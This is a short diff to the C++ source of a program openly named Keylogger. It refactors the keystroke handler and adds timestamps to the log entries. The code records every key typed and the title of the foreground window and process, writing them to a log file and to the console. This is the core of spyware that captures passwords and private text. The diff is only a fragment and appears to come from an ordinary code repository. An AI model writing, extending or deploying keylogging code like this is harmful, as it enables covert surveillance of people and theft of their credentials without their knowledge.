@@ -14,6 +14,14 @@ void Keylogger::start() {
 }
 
 void Keylogger::keyboardHandler(const wchar_t* keyText) {
+	addWindowTimeStamps();
+		
+	auto symbol = keyText;
+	logFile << wcharToStr(keyText) << std::flush;
+	std::cout << wcharToStr(keyText) << std::flush;
+}
+
+void Keylogger::addWindowTimeStamps() {
 	// Get window title and write it to file
 	HWND currentWindow = GetForegroundWindow();
 	if (currentWindow != lastActiveWindow) {
@@ -32,17 +40,19 @@ void Keylogger::keyboardHandler(const wchar_t* keyText) {
 		// Get windows title
 		GetWindowText(currentWindow, bufferTitle, bufferSize);
 
+		tm* localTime;
+		time_t t = time(NULL);
+		localTime = localtime(&t);
+		char timeStrBuffer[80];
+		strftime(timeStrBuffer, 80, "%F %X", localTime);
+
 		if (bufferTitle == nullptr || bufferTitle[0] == '\0') {
-			wcout << "!!!!ploho!!!";
+			std::cout << "!!!!ploho!!!";
 		} else {
-			std::cout << "\n### " << wcharToStr(bufferProcessName) << " --- " << wcharToStr(bufferTitle) << " ###\n";
+			std::cout << "\n### " << wcharToStr(bufferProcessName) << " --- " << wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
 		}
-		logFile << "\n### " << wcharToStr(bufferProcessName) << " --- " << wcharToStr(bufferTitle) << " ###\n";
+		logFile << "\n### " << wcharToStr(bufferProcessName) << " --- " << wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
 	}
-		
-	auto symbol = keyText;
-	logFile << wcharToStr(keyText) << std::flush;
-	std::cout << wcharToStr(keyText) << std::flush;
 }
 
 string Keylogger::wcharToStr(const wchar_t* str) {
